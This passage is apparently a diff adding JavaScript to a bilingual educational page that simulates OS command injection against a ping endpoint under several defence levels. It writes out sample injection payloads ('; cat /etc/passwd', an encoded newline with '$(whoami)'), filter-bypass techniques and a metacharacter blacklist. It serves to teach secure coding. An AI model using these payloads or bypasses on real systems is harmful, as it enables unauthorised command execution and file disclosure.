+      if (sec && sec.offsetTop <= scrollPos) {
+        currentActive = navIds[i];
+      }
+    }
+
+    subNavBtns.forEach(function(btn) {
+      var href = btn.getAttribute('href');
+      if (currentActive && (href === '#' + currentActive || (currentActive === 'code-fixes' && href === '#simulator'))) {
+        btn.classList.add('active');
+      } else {
+        btn.classList.remove('active');
+      }
+    });
+  }
+
+  window.addEventListener('scroll', updateSubNavScrollSpy, { passive: true });
+  updateSubNavScrollSpy();
+
+  document.querySelectorAll('.check-input').forEach(input => {
+    input.addEventListener('change', function() {
+      if(this.checked) {
+        this.closest('.check-label').classList.add('checked');
+      } else {
+        this.closest('.check-label').classList.remove('checked');
+      }
+    });
+  });
+
+  var fullTextHi = "OS Command Injection tab hoti hai jab ek application user input ko directly system shell (bash, sh, cmd.exe) mein concatenate karke execute karta hai. Attacker shell metacharacters (; | && ` $()) inject karke operating system par arbitrary commands execute kar sakta hai, sensitive files read kar sakta hai, aur poore host server ka full control le sakta hai....";
+  var fullTextEn = "OS Command Injection occurs when an application passes untrusted user data directly to a system shell (bash, sh, cmd.exe) without adequate validation or escaping. Attackers inject shell metacharacters (; | && ` $()) to execute arbitrary system commands, compromise host data, and achieve full remote code execution (RCE)....";
+
+  var twEl = document.getElementById('typewriter');
+  function updateTypewriter() {
+      var isEn = document.documentElement.getAttribute('data-lang') === 'en';
+      twEl.textContent = isEn ? fullTextEn : fullTextHi;
+  }
+
+  if(reduceMotion){
+    updateTypewriter();
+  } else {
+    var i = 0;
+    var currentText = document.documentElement.getAttribute('data-lang') === 'en' ? fullTextEn : fullTextHi;
+    function typeStep(){
+      if(i <= currentText.length){
+        twEl.textContent = currentText.slice(0, i);
+        i += 2;
+        setTimeout(typeStep, 12);
+      }
+    }
+    typeStep();
+  }
+
+  if(langToggle) langToggle.addEventListener('change', updateTypewriter);
+
+  /* ---------- COMMAND INJECTION SIMULATOR LOGIC ---------- */
+  let currentOrigin = 'semicolon';
+  let currentDefense = '0';
+
+  const originValues = {
+    semicolon: "8.8.8.8; cat /etc/passwd",
+    bypass: "8.8.8.8%0a$(whoami)"
+  };
+
+  const defenseNames = {
+    '0': '0: No Filtering',
+    '1': '1: Basic Blacklist (;|&)',
+    '2': '2: Pre-decode Blacklist',
+    '3': '3: Naive Quoting',
+    '4': '4: No-Shell + Allowlist (Final)'
+  };
+
+  document.querySelectorAll('#opt-origin .sim-btn').forEach(btn => {
+    btn.addEventListener('click', () => {
+      document.querySelectorAll('#opt-origin .sim-btn').forEach(b => b.classList.remove('active'));
+      btn.classList.add('active');
+      currentOrigin = btn.getAttribute('data-val');
+      document.getElementById('lbl-payload').innerHTML = originValues[currentOrigin];
+    });
+  });
+
+  document.querySelectorAll('#opt-defense .sim-btn').forEach(btn => {
+    btn.addEventListener('click', () => {
+      document.querySelectorAll('#opt-defense .sim-btn').forEach(b => b.classList.remove('active'));
+      btn.classList.add('active');
+      currentDefense = btn.getAttribute('data-val');
+      document.getElementById('lbl-defense').innerText = defenseNames[currentDefense];
+    });
+  });
+
+  const btnExecute = document.getElementById('btn-execute');
+  const logBrowser = document.getElementById('log-browser');
+  const logNetwork = document.getElementById('log-network');
+  const logServer = document.getElementById('log-server');
+  const verdictBox = document.getElementById('sim-verdict-box');
+  const verdictTitle = document.getElementById('sim-verdict-title');
+  const verdictText = document.getElementById('sim-verdict-text');
+
+  const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
+
+  function appendLog(panel, htmlStrHi, htmlStrEn) {
+    const isEn = document.documentElement.getAttribute('data-lang') === 'en';
+    const div = document.createElement('div');
+    div.className = 'log-line';
+    div.innerHTML = `<span class="timestamp">${new Date().toISOString().split('T')[1].slice(0,-1)}</span> <span>${isEn ? htmlStrEn : htmlStrHi}</span>`;
+    panel.appendChild(div);
+    panel.scrollTop = panel.scrollHeight;
+  }
+
+  function appendNetworkLog(panel, htmlStr) {
+    const div = document.createElement('div');
+    div.className = 'log-line';
+    div.innerHTML = `<span class="timestamp">${new Date().toISOString().split('T')[1].slice(0,-1)}</span> ${htmlStr}`;
+    panel.appendChild(div);
+    panel.scrollTop = panel.scrollHeight;
+  }
+
+  function appendStage(panel, strHi, strEn) {
+    const isEn = document.documentElement.getAttribute('data-lang') === 'en';
+    const div = document.createElement('div');
+    div.className = 'log-line log-stage';
+    div.innerHTML = `<span>${isEn ? strEn : strHi}</span>`;
+    panel.appendChild(div);
+    panel.scrollTop = panel.scrollHeight;
+  }
+
+  function clearLogs() {
+    logBrowser.innerHTML = `
+        <div style="margin-bottom:10px;"><span class="c-info">Payload:</span> <br> <code class="inline-code" id="lbl-payload">${originValues[currentOrigin]}</code></div>
+        <div><span class="c-info">Current Defense:</span> <br> <span class="c-warn" id="lbl-defense">${defenseNames[currentDefense]}</span></div>
+        <hr style="border-color:#1f242d; margin: 15px 0;">
+    `;
+    logNetwork.innerHTML = '';
+    logServer.innerHTML = '';
+    verdictBox.className = 'sim-verdict-box';
+    verdictTitle.innerHTML = '';
+    verdictText.innerHTML = '';
+  }
+
+  clearLogs();
+
+  btnExecute.addEventListener('click', async () => {
+    btnExecute.disabled = true;
+    clearLogs();
+
+    let payload = originValues[currentOrigin];
+    let decodedPayload = currentOrigin === 'bypass' ? "8.8.8.8\ncat... $(whoami)" : payload;
+
+    // STAGE 1: CLIENT
+    appendStage(logBrowser, "▶ STEP 1: CLIENT REQUEST", "▶ STEP 1: CLIENT REQUEST");
+    await sleep(300);
+    appendLog(logBrowser,
+      `<span class="c-info">Action: Form submits input field with payload...</span>`,
+      `<span class="c-info">Action: Form submits input field with payload...</span>`);
+    await sleep(400);
+
+    // STAGE 2: NETWORK
+    appendStage(logNetwork, "▶ STEP 2: OUTGOING TRAFFIC", "▶ STEP 2: OUTGOING TRAFFIC");
+    await sleep(300);
+    appendNetworkLog(logNetwork, `<span class="c-blue">>>> OUTGOING HTTP REQUEST</span>`);
+    const rawReqBlock = document.createElement('div');
+    rawReqBlock.className = 'http-block';
+    logNetwork.appendChild(rawReqBlock);
+    const writeNetwork = async (text) => {
+      const el = document.createElement('div'); el.className = 'log-line'; el.style.opacity = '1'; el.innerHTML = text;
+      rawReqBlock.appendChild(el); logNetwork.scrollTop = logNetwork.scrollHeight; await sleep(150);
+    };
+    await writeNetwork(`<span class="http-method">POST</span> <span class="http-path">/api/ping</span> <span class="http-proto">HTTP/1.1</span>`);
+    await writeNetwork(`<span class="http-header-key">Host:</span> <span class="http-header-val">target-app.com</span>`);
+    await writeNetwork(`<span class="http-body">ip=${payload}</span>`);
+
+    // STAGE 3: APP LOGIC
+    await sleep(500);
+    appendStage(logServer, "▶ STEP 3: BACKEND VALIDATION LOGIC", "▶ STEP 3: BACKEND VALIDATION LOGIC");
+    await sleep(300);
+    appendLog(logServer,
+      `<span class="loader"></span> <span class="c-info">Processing input: ${payload}</span>`,
+      `<span class="loader"></span> <span class="c-info">Processing input: ${payload}</span>`);
+    await sleep(500);
+
+    let blocked = false;
+    let commandExecuted = "";
+
+    if (currentDefense === '0') {
+      appendLog(logServer, `<span class="c-err">Koi validation nahi. Seedha shell string mein concatenate ho raha hai.</span>`, `<span class="c-err">No validation at all. Directly concatenated into the shell string.</span>`);
+      commandExecuted = `ping -c 4 ${currentOrigin === 'bypass' ? '8.8.8.8\ncat... $(whoami)' : payload}`;
+    } else if (currentDefense === '1') {
+      appendLog(logServer, `<span class="c-info">Checking blacklist [;, |, &] on raw input...</span>`, `<span class="c-info">Checking blacklist [;, |, &] on raw input...</span>`);
+      await sleep(400);
+      if (currentOrigin === 'semicolon') {
+        appendLog(logServer, `<span class="c-ok">';' found! Request rejected.</span>`, `<span class="c-ok">';' found! Request rejected.</span>`);
+        blocked = true;
+      } else {
+        appendLog(logServer, `<span class="c-err">Blacklist passed (no ;|& in raw string). Decoding %0a to newline, forwarding to shell...</span>`, `<span class="c-err">Blacklist passed (no ;|& in raw string). Decoding %0a to newline, forwarding to shell...</span>`);
+        commandExecuted = `ping -c 4 8.8.8.8\ncat... $(whoami)`;
+      }
+    } else if (currentDefense === '2') {
+      appendLog(logServer, `<span class="c-info">Checking extended blacklist [;,|,&,\`,$,(,),\\n] on RAW (still-encoded) param...</span>`, `<span class="c-info">Checking extended blacklist [;,|,&,\`,$,(,),\\n] on RAW (still-encoded) param...</span>`);
+      await sleep(400);
+      if (currentOrigin === 'semicolon') {
+        appendLog(logServer, `<span class="c-ok">';' found in raw string! Request rejected.</span>`, `<span class="c-ok">';' found in raw string! Request rejected.</span>`);
+        blocked = true;
+      } else {
+        appendLog(logServer, `<span class="c-warn">Raw string uses %0a/%24/%28/%29 (fully percent-encoded) — no literal blacklisted char found. PASSED.</span>`, `<span class="c-warn">Raw string uses %0a/%24/%28/%29 (fully percent-encoded) — no literal blacklisted char found. PASSED.</span>`);
+        await sleep(300);
+        appendLog(logServer, `<span class="c-err">Framework decodes AFTER the filter ran. Newline + $() now active, forwarded to shell.</span>`, `<span class="c-err">Framework decodes AFTER the filter ran. Newline + $() now active, forwarded to shell.</span>`);
+        commandExecuted = `ping -c 4 8.8.8.8\ncat... $(whoami)`;
+      }
+    } else if (currentDefense === '3') {
+      appendLog(logServer, `<span class="c-info">Wrapping input in double-quotes: ping -c 4 "INPUT"</span>`, `<span class="c-info">Wrapping input in double-quotes: ping -c 4 "INPUT"</span>`);
+      await sleep(400);
+      if (currentOrigin === 'semicolon') {
+        appendLog(logServer, `<span class="c-ok">';' neutralized inside double-quotes (literal string, no separation).</span>`, `<span class="c-ok">';' neutralized inside double-quotes (literal string, no separation).</span>`);
+        blocked = true;
+      } else {
+        appendLog(logServer, `<span class="c-err">$() is NOT neutralized by double-quotes per POSIX rules — command substitution still runs.</span>`, `<span class="c-err">$() is NOT neutralized by double-quotes per POSIX rules — command substitution still runs.</span>`);
+        commandExecuted = `ping -c 4 "8.8.8.8\ncat... $(whoami)"`;
+      }
+    } else if (currentDefense === '4') {
+      appendLog(logServer, `<span class="c-info">Validating against strict allowlist regex ^(\\d{1,3}\\.){3}\\d{1,3}$ ...</span>`, `<span class="c-info">Validating against strict allowlist regex ^(\\d{1,3}\\.){3}\\d{1,3}$ ...</span>`);
+      await sleep(500);
+      appendLog(logServer, `<span class="c-ok">Format mismatch. Rejected BEFORE reaching execution. (Even if it passed, subprocess.run([...], shell=False) treats it as one literal, inert argument.)</span>`, `<span class="c-ok">Format mismatch. Rejected BEFORE reaching execution. (Even if it passed, subprocess.run([...], shell=False) treats it as one literal, inert argument.)</span>`);
+      blocked = true;
+    }
+
+    await sleep(400);
+
+    // STAGE 4: SHELL EXECUTION
+    appendStage(logServer, "▶ STEP 4: OS SHELL EXECUTION", "▶ STEP 4: OS SHELL EXECUTION");
+    await sleep(300);
+
+    let attackSuccess = false;
+
+    if (blocked) {
+      appendLog(logServer, `<span class="c-ok">Command never reached the shell in a dangerous form. No extra command executed.</span>`, `<span class="c-ok">Command never reached the shell in a dangerous form. No extra command executed.</span>`);
+    } else {
+      appendLog(logServer, `<span class="c-warn">Shell receives: ${commandExecuted}</span>`, `<span class="c-warn">Shell receives: ${commandExecuted}</span>`);
+      await sleep(400);
+      appendLog(logServer, `<span class="c-err">Shell parses metacharacter as separator/substitution. Extra command executes with the app's own privileges.</span>`, `<span class="c-err">Shell parses metacharacter as separator/substitution. Extra command executes with the app's own privileges.</span>`);
+      attackSuccess = true;
+    }
+
+    await sleep(600);
+    const isEn = document.documentElement.getAttribute('data-lang') === 'en';
+
+    if (attackSuccess) {
+      verdictBox.classList.remove('v-blocked');
+      verdictBox.classList.add('v-hacked', 'show');
+      verdictTitle.innerHTML = `💀 RCE ACHIEVED (COMMAND EXECUTED)`;
+    } else {
+      verdictBox.classList.remove('v-hacked');
+      verdictBox.classList.add('v-blocked', 'show');
+      verdictTitle.innerHTML = `🛡️ INPUT BLOCKED (NO EXECUTION)`;
+    }
+
+    let explanationHi = "";
+    let explanationEn = "";
+
+    if (currentDefense === '0') {
+      explanationHi = "Koi filtering hi nahi thi, isliye chaahe payload semicolon wala ho ya encoded newline+substitution wala, dono seedha shell tak pahunch gaye aur attacker ka command execute ho gaya.";
+      explanationEn = "There was no filtering at all, so whether the payload used a semicolon or an encoded newline+substitution, both reached the shell directly and the attacker's command executed.";
+    } else if (currentDefense === '1') {
+      if (currentOrigin === 'semicolon') {
+        explanationHi = "Basic blacklist ne <code>;</code> ko literal raw input mein dhundh liya aur request reject kar di. Is specific payload ke against ye defense kaam kar gaya.";
+        explanationEn = "The basic blacklist found the literal <code>;</code> in the raw input and rejected the request. Against this specific payload, this defense worked.";
+      } else {
+        explanationHi = "Blacklist sirf <code>;</code>, <code>|</code>, <code>&</code> check karti thi. Newline aur <code>$()</code> is list mein nahi the, isliye encoded payload PASS ho gaya aur decode hone ke baad shell mein command inject ho gaya.";
+        explanationEn = "The blacklist only checked for <code>;</code>, <code>|</code>, <code>&</code>. Newline and <code>$()</code> weren't in that list, so the encoded payload PASSED and, once decoded, injected a command into the shell.";
+      }
+    } else if (currentDefense === '2') {
+      if (currentOrigin === 'semicolon') {
+        explanationHi = "Extended blacklist ne raw string mein literal <code>;</code> turant dhundh liya aur block kar diya.";
+        explanationEn = "The extended blacklist immediately found the literal <code>;</code> in the raw string and blocked it.";
+      } else {
+        explanationHi = "Attacker ne har dangerous character ko percent-encode kar diya, isliye filter (jo decode hone SE PEHLE chalta hai) ko koi literal blacklisted character nahi mila. Baad mein framework ne decode kiya aur newline + $() apna kaam kar gaye — order-of-operations ki galti.";
+        explanationEn = "The attacker percent-encoded every dangerous character, so the filter (which runs BEFORE decoding) found no literal blacklisted character. The framework later decoded it, and the newline + $() did their job — an order-of-operations flaw.";
+      }
+    } else if (currentDefense === '3') {
+      if (currentOrigin === 'semicolon') {
+        explanationHi = "Double-quotes ke andar <code>;</code> apna special meaning kho deta hai — poora input ek literal string ban gaya, koi extra command execute nahi hua.";
+        explanationEn = "Inside double-quotes, <code>;</code> loses its special meaning — the whole input became a literal string, no extra command executed.";
+      } else {
+        explanationHi = "POSIX rule ke mutaabik <code>$()</code> command substitution DOUBLE-QUOTES ke andar bhi active rehta hai. Isiliye quoting ne sirf <code>;</code>/<code>|</code>/<code>&</code> ko roka, lekin <code>$(whoami)</code> phir bhi execute ho gaya.";
+        explanationEn = "Per POSIX rules, <code>$()</code> command substitution remains active even INSIDE DOUBLE-QUOTES. So quoting only stopped <code>;</code>/<code>|</code>/<code>&</code>, but <code>$(whoami)</code> still executed.";
+      }
+    } else if (currentDefense === '4') {
+      explanationHi = "Input ek strict allowlist regex (sirf digits+dots) ke against validate hua aur match nahi kiya, isliye request execution tak pahunchi hi nahi. Aur agar pahunch bhi jaata, <code>shell=False</code> ke saath koi shell parsing hoti hi nahi — poora input ek hi, inert, literal argument ki tarah treat hota. Dono layers milkar ise robust bana dete hain.";
+      explanationEn = "The input was validated against a strict allowlist regex (digits and dots only) and didn't match, so the request never reached execution. And even if it had, with <code>shell=False</code> there is no shell parsing at all — the entire input is treated as a single, inert, literal argument. Both layers together make this robust.";
+    }
+
+    verdictText.innerHTML = isEn ? explanationEn : explanationHi;
+    btnExecute.disabled = false;
+  });
+
+});
+</script>
+
+</body>
+</html>
